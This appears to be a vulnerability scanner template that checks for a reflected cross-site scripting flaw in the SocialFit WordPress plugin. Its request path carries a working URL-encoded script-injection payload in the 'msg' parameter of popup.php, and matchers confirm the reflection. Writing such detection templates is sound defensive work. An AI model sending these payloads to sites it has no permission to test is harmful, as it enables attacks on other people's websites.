id: wp-socialfit-xss
info:
  author: daffainfo
  description: 'SocialFit plugin for WordPress is prone to a cross-site scripting
    vulnerability because it fails to properly sanitize user-supplied input.

    '
  name: WordPress Plugin SocialFit - 'msg' Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/37481
  severity: medium
  tags: wordpress,xss,wp-plugin
requests:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
